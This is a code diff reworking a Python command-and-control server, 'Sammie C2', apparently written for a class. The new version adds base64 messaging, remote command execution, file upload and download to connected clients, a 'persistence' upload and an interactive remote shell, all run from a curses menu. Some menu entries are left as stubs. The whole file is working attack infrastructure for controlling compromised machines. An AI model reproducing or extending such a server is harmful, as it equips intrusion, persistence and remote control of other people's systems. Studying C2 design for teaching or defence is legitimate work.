@@ -1,198 +1,418 @@
-import argparse, curses, socket, threading, time, uuid
+#!/usr/bin/python3
 
-clients = []
-lock = threading.Lock()
+import socket, threading, os, time, base64, uuid, curses, curses.ascii
 
-def get_arguments():
-  parser = argparse.ArgumentParser(description='Starts C2 server for Sammie\'s Class')
-  parser.add_argument('-p', '--port', type=int, default=12568, help='Listening port (Default: 12568)', dest='port')
-  return parser.parse_args()
+connected_clients = []
+clients_lock = threading.Lock()
 
+os.system("export TERM='xterm-256color'")
 
-def read_until_eod(c):
-  data = c.recv(4096).decode()
+def recv_until_newline(socket):
+  data = socket.recv(1)
+  while data[-1] != 10:
+    data += socket.recv(1)
 
-  while data[-4:] != "EOD\n":
-    data += c.recv(4096).decode()
+  return data[:-1]
 
-  data = data.strip()[:-3]
+def recv_base64(socket):
+  b64_data = recv_until_newline(socket)
 
-  return data
+  data = base64.b64decode(b64_data).decode()
 
-def new_client(client_socket, addr):
-  global clients
+  return data.strip()
+
+def send_as_base64(data, socket):
+  b64_data = base64.b64encode(data.encode()) + b"\n"
+  socket.send(b64_data)
+  return len(b64_data)
+
+class Client:
+  def __init__(self, socket):
+    self.socket = socket
+    self.ftp = None
+    self.shell = None
   
-  data = read_until_eod(client_socket)
+  def send(self, data):
+    return send_as_base64(data, self.socket)
+  
+  def recv(self):
+    return recv_base64(self.socket)
 
-  if data.startswith("reconnect"):
-    cid = data.split(" ")[1].strip()
-    print(cid)
-    with lock:
-      possible = list(filter(lambda k: k["cid"] == cid, clients))
+  def register(self):
+    self.sysinfo = self.recv()
+    self.id = str(uuid.uuid4())
+    self.send("id " + self.id)
+
+  def close(self):
+    self.send("gtfo")
+    self.socket.close()
+    self.socket = None
+
+  def execute_command(self, command):
+    self.send("x " + command)
+    return self.recv()
+
+  def send_file(self, local_file_path, client_file_path):
+    self.send("d " + client_file_path)
+    with open(local_file_path, 'rb') as f:
+      data = f.read()
+    b64_data = base64.b64encode(data) + b"\n"
+    wait_count = 0
+    while self.ftp == None and wait_count < 600:
+      time.sleep(0.1)
+      wait_count += 1
     
-      if possible:
-        possible[0]["socket"].close()
-        possible[0]["socket"] = client_socket
-      else:
-        client_socket.close()
+    if self.ftp == None:
+      return False
+    
+    self.ftp.send(b64_data)
+    self.ftp.close()
+    self.ftp = None
+    return True
+  
+  def recieve_file(self, local_file_path, client_file_path):
+    self.send("u " + client_file_path)
+
+    wait_count = 0
+    while self.ftp == None and wait_count < 600:
+      time.sleep(0.1)
+      wait_count += 1
+
+    if self.ftp == None:
+      return False
+
+    b64_data = recv_until_newline(self.socket)
+    
+    data = base64.b64decode(b64_data)
+
+    with open(local_file_path, 'wb') as f:
+      f.write(data)
+
+    return True
+
+  def create_persistence(self, local_file_path, client_file_path):
+    self.send("p " + client_file_path)
+    with open(local_file_path, 'rb') as f:
+      data = f.read()
+    b64_data = base64.b64encode(data) + b"\n"
+    wait_count = 0
+    while self.ftp == None and wait_count < 600:
+      time.sleep(0.1)
+      wait_count += 1
+    
+    if self.ftp == None:
+      return False
+    
+    self.ftp.send(b64_data)
+    self.ftp.close()
+    self.ftp = None
+    return True
+    
+
+  def spawn_shell(self):
+    self.send("shell")
+
+    wait_count = 0
+    while self.shell == None and wait_count < 600:
+      time.sleep(0.1)
+      wait_count += 1
+
+    if self.shell == None:
+      return False
+
+    self.shell_thread = threading.Thread(target=self.shell_recv)
+    self.shell_thread.start()
+    self.shell_lock = threading.Lock()
+    self.shell_data = ""
+    
+    return True
+
+  def shell_send(self, data):
+    return self.shell.send(data.encode())
+
+  def shell_recv(self):
+    t = threading.currentThread()
+
+    while getattr(t, "running", True):
+      data = self.shell.recv(1024).decode()
+
+      with self.shell_lock:
+        self.shell_data += data
+
+      time.sleep(0.1)
+
+    self.shell.close()
+
+  def shell_read(self):
+    with self.shell_lock:
+      data = self.shell_data
+      self.shell_data = ""
+    
+    return data
+
+
+class Server:
+  def __init__(self):
+    self.socket = socket.socket(socket.SO_REUSEADDR)
+  
+  def serve(self, port, handle_client):
+    t = threading.currentThread()
+
+    self.socket.bind(("0.0.0.0", port))
+    self.socket.listen(5)
+
+    while getattr(t, "running", True):
+      c, a = self.socket.accept()
+      handle_client(c)
+
+  def close(self):
+    self.socket.close()
+
+def handle_client(c):
+  global connected_clients
+  client = Client(c)
+  client_type = client.recv()
+
+  if client_type.startswith("new"):
+    client.register()
+
+    with clients_lock:
+      connected_clients.append(client)
+
     return
-    
 
+  key = client_type[:2]
 
+  if key in ["ul", "dl", "sh", "re"]:
+    cid = client_type.split(" ")[-1].strip()
+    with clients_lock:
+      possible = list(filter(lambda cl: cl.id == cid, connected_clients))
+      if len(possible) == 0:
+        client.close()
+        return
 
-  with lock:
-    cid = str(uuid.uuid4())
-    client_socket.send(("id " + cid + "\n").encode())
-    clients.append(dict(socket=client_socket, addr=addr, data=data, cid=cid))
-
+      if key in ["ul", "dl"]:
+        possible[0].ftp = c
+        return
+      elif key == "re":
+        possible[0].socket.close()
+        possible[0].socket = c
+        return
+      else:
+        possible[0].shell = c
+        return
+    return
   
-
-def listen_for_clients(port):
-  t = threading.currentThread()
-  
-  s = socket.socket()
-
-  s.bind(("0.0.0.0", port))
-  s.listen(5)
-
-  while getattr(t, "running", True):
-    c, addr = s.accept()
-    threading.Thread(target=new_client, args=(c,addr,)).start()
-
-  for client in clients:
-    client['socket'].send("gtfo\n".encode())
-    client['socket'].close()
-
+  client.close()
   return
 
-def client_menu(stdscr, c_num):
-  with lock:
-    client = clients[c_num]
+def fake_connect():
+  s = socket.socket()
 
-  c_menu = True
+  s.connect(("localhost", 2222))
+  s.send("REVBREJFRUY=\n".encode())
+  s.close()
 
-  selected = 0
+def curses_logo(stdscr):
+  LOGO = """
+   _____                           _       _________ 
+  / ___/____ _____ ___  ____ ___  (_)__   / ____/__ \\
+  \__ \/ __ `/ __ `__ \/ __ `__ \/ / _ \ / /    __/ /
+ ___/ / /_/ / / / / / / / / / / / /  __// /___ / __/ 
+/____/\__,_/_/ /_/ /_/_/ /_/ /_/_/\___/ \____//____/ 
+Made with love and shoddy code""".split("\n")[1:]
 
-  while c_menu:
-    c = stdscr.getch()
-    curses.flushinp()
+  y,x = stdscr.getmaxyx()
 
-    if (c == curses.KEY_ENTER or c == 10 or c == 13):
-      if selected == 0:
-        c_menu = False
-      elif selected == 1: # Disconnect
-        client["socket"].send(b"gtfo\n")
-        with lock:
-          client["socket"].close()
-          clients.remove(client)
-        c_menu = False
-      elif selected == 2: # Execute Command
-        execute_menu(stdscr, client)
-      elif selected == 3: # Download File
-        download_menu(stdscr, client)
-      elif selected == 4: # Upload File
-        upload_menu(stdscr, client)
-      elif selected == 5: # Open Shell
-        shell_menu(stdscr, client)
-    elif c == curses.KEY_DOWN:
-      selected = (selected + 1)%6
-    elif c == curses.KEY_UP:
-      selected = (selected - 1)%6
+  w = len(LOGO[0])
+  h = len(LOGO)
 
+  wp = (x-w)//2-1
+  hp = (y-h)//2-1
 
-    stdscr.clear()
-
-    stdscr.addstr(0,0,"Connected to client", curses.color_pair(5))
-    stdscr.addstr(1,0,client["data"],curses.color_pair(3))
-
-    stdscr.addstr(3,0,"<- Back", curses.A_REVERSE if selected == 0 else 0)
-    stdscr.addstr(4,0,"Disconnect Client", curses.A_REVERSE if selected == 1 else 0)
-    stdscr.addstr(5,0,"Execute Command", curses.A_REVERSE if selected == 2 else 0)
-    stdscr.addstr(6,0,"Download File from Client", curses.A_REVERSE if selected == 3 else 0)
-    stdscr.addstr(7,0,"Upload File to Client", curses.A_REVERSE if selected == 4 else 0)
-    stdscr.addstr(8,0,"Open Shell", curses.A_REVERSE if selected == 5 else 0)
-
-    time.sleep(0.1)
-
-
-
-def nice_menu_function(stdscr):
   stdscr.clear()
+
+  for i,line in enumerate(LOGO):
+    if i == h-1:
+      stdscr.addstr(i+hp, wp, line, curses.color_pair(227))
+    else:
+      stdscr.addstr(i+hp, wp, line)
+
+  stdscr.refresh()
+
+  time.sleep(2)
+
+def curses_main(stdscr):
   curses.curs_set(0)
-  curses.use_default_colors()
   stdscr.nodelay(True)
-  height,width = stdscr.getmaxyx()
 
-  running = True
-
-  selected = 0
-
+  curses.start_color()
+  curses.use_default_colors()
   for i in range(0, curses.COLORS):
     curses.init_pair(i + 1, i, -1)
 
-  while running:
-    c = stdscr.getch()
-    curses.flushinp()
-    
+  curses_logo(stdscr)
 
-    if c == ord('q'):
-      running = False
-    elif curses.KEY_RESIZE == c:
-      height,width = stdscr.getmaxyx()
-    
-    elif c == curses.KEY_DOWN and len(clients) > 0:
-      selected = (selected + 1) % len(clients)
-    elif c == curses.KEY_UP and len(clients) > 0:
-      selected = (selected - 1) % len(clients)
+  k = 0
 
-    elif (c == curses.KEY_ENTER or c == 10 or c == 13) and len(clients) > 0:
-      client_menu(stdscr, selected)
+  menu_selected = 0
+  menu_offset = 0
+
+  while k != 113:
+    with clients_lock:
+      menu = [(client.id, client) for client in connected_clients]
 
     stdscr.clear()
+    curses.doupdate()
+    k = stdscr.getch()
+    curses.flushinp()
+    h,w = stdscr.getmaxyx()
 
-    stdscr.addstr(0, 0, "Sammie C2 Server", curses.color_pair(5))
-    stdscr.addstr(1, 0, "Connected Clients", curses.color_pair(3))
-    stdscr.addstr(height-1, 0, "Press 'q' to quit server")
+    if menu_selected > h:
+      menu_offset = menu_selected - (h-1)
+    
+    if len(menu):
+      for i,client in enumerate(menu[menu_offset:menu_offset+h-1]):
+        if i == menu_selected-menu_offset:
+          stdscr.addstr(i, 0, str(i+1+menu_offset) + ") " + client[0], curses.A_REVERSE)
+        else:
+          stdscr.addstr(i, 0, str(i+1+menu_offset) + ") " + client[0])
+    else:
+      stdscr.addstr(0,0,"No Clients Connected")
 
-    with lock:
-      if len(clients) == 0:
-        stdscr.addstr(3,0,"No clients connected")
-      else:
-        for i, client in enumerate(clients):
-          if i == selected:
-            stdscr.addstr(i+3,0,str(i) + ") " + client['data'], curses.A_REVERSE)
-          else:
-            stdscr.addstr(i+3,0,str(i) + ") " + client['data'])
+    stdscr.addstr(h-1,0,"Press 'q' to quit")
 
     stdscr.refresh()
 
-    time.sleep(0.1)
+    if len(menu):
+      if k == curses.KEY_UP:
+        menu_selected = (menu_selected-1)%len(menu)
+      elif k == curses.KEY_DOWN:
+        menu_selected = (menu_selected+1)%len(menu)
+      elif k == curses.KEY_ENTER or k == 10:
+        curses_client_menu(stdscr, menu[menu_selected][1])
+
+    time.sleep(.1)
+
+def remove_client(client):
+  global connected_clients
+
+  with clients_lock:
+    connected_clients.remove(client)
+
+def curses_shell(stdscr, client):
+  input_value = ""
+  shell_output = []
+
+  while True:
+    stdscr.clear()
+    curses.doupdate()
+    h,w = stdscr.getmaxyx()
+    k = stdscr.getch()
+    curses.flushinp()
+
+    if curses.ascii.isascii(k):
+      input_value += chr(k)
+    if k in [curses.KEY_BACKSPACE, ord('\b')]:
+      input_value = input_value[:-1]
+    if k == curses.KEY_ENTER or k == 10 or "\n" in input_value:
+      client.shell_send(input_value.split("\n")[0] + "\n")
+      input_value = ""
+
+    new_output = client.shell_read()
+
+    if new_output:
+      shell_output += new_output.split("\n")
+      new = []
+
+      for line in shell_output:
+        if line:
+          new.append(line)
+
+      shell_output = new
+
+    if len(shell_output) > h-1:
+      shell_output = shell_output[-h+2:]
+
+    for i,line in enumerate(shell_output):
+      stdscr.addstr(i,0,line[:w])
+
+    stdscr.addstr(h-1,0, "$ " + input_value[-w+2:])
+    stdscr.refresh()
+    time.sleep(.1)
+    
+
+
+
+
+def curses_client_menu(stdscr, client):
+  menu_selected = 0
+
+  menu_options = ["Back", "Execute Command", "Download File", "Upload File", "Upload Persistence", "Spawn Shell", "Disconnect"]
+
+  while True:
+    stdscr.clear()
+    curses.doupdate()
+    k = stdscr.getch()
+    curses.flushinp()
+    h,w = stdscr.getmaxyx()
+
+    if k == curses.KEY_UP:
+      menu_selected = (menu_selected-1)%len(menu_options)
+    elif k == curses.KEY_DOWN:
+      menu_selected = (menu_selected+1)%len(menu_options)
+    elif k == curses.KEY_ENTER or k == 10:
+      if menu_selected == 0:
+        return
+      elif menu_selected == 1:
+        pass
+      elif menu_selected == 2:
+        pass
+      elif menu_selected == 3:
+        pass
+      elif menu_selected == 4:
+        pass
+      elif menu_selected == 5:
+        if client.spawn_shell():
+          curses_shell(stdscr, client)
+        else:
+          client.close()
+          remove_client(client)
+          return
+      elif menu_selected == 6:
+        client.close()
+        remove_client(client)
+        return
+      
+    for i,option in enumerate(menu_options):
+      if i == menu_selected:
+        stdscr.addstr(i,0,option, curses.A_REVERSE)
+      else:
+        stdscr.addstr(i,0,option)
+
+    stdscr.refresh()
+    time.sleep(.1)
+
 
 
 def main():
-  args = get_arguments()
+  s = Server()
 
-  t = threading.Thread(target=listen_for_clients, args=(args.port,))
-  t.start()
-
+  server_thread = threading.Thread(target=s.serve, args=(2222, handle_client))
+  server_thread.start()
 
   try:
-    #input("")
-    curses.wrapper(nice_menu_function)
+    curses.wrapper(curses_main)
   except KeyboardInterrupt:
     pass
+  
+  server_thread.running = False
+  fake_connect()
 
-  t.running = False
+  for client in connected_clients:
+    client.close()
 
-  s = socket.socket()
-  s.connect(("127.0.0.1", args.port))
-  s.send("EOD\n".encode())
-  s.close()
-
-  t.join()
-
-  return
-
+  server_thread.join()
 
 if __name__ == "__main__":
   main()
